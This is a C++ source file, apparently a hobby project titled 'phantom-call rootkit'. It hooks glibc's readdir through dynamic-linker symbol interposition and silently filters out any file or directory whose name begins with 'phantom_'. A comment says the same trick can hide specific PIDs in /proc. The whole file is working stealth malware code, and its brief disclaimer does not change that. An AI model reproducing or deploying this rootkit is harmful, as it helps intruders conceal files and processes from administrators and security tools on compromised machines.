**File: `phantom_hook.cpp`**
```cpp
// dande | phantom-call rootkit
// glibc call hooking for system-level stealth.
// 3am project. don't use this for malice.

#define _GNU_SOURCE
#include <dlfcn.h>
#include <dirent.h>
#include <iostream>
#include <string.h>
#include <unistd.h>

// define function pointer signature for the original 'readdir' function
typedef struct dirent *(*readdir_t)(DIR *);

// global variable to hold the address of the real glibc readdir function
readdir_t original_readdir = NULL;

// we define 'readdir' here, which the dynamic linker loads FIRST
extern "C" struct dirent *readdir(DIR *dirp) {
    // on first call, locate the original glibc readdir function using dlsym
    if (original_readdir == NULL) {
        original_readdir = (readdir_t)dlsym(RTLD_NEXT, "readdir");
        if (original_readdir == NULL) {
            // failed to locate real readdir (fatal system error, but we fail silently for stealth)
            return NULL; 
        }
    }

    struct dirent *entry;

    // loop and intercept directory entries
    while ((entry = original_readdir(dirp)) != NULL) {
        // stealth logic: check if the file/process name starts with "phantom_"
        // this can be easily adapted to hide specific PIDs in /proc/
        if (strncmp(entry->d_name, "phantom_", 8) == 0) {
            // we found our object. do NOT return this entry.
            // glibc will call readdir again, effectively filtering the entry.
            continue;
        } else {
            // not our object. return standard entry.
            return entry;
        }
    }

    // no more entries in directory
    return NULL;
}
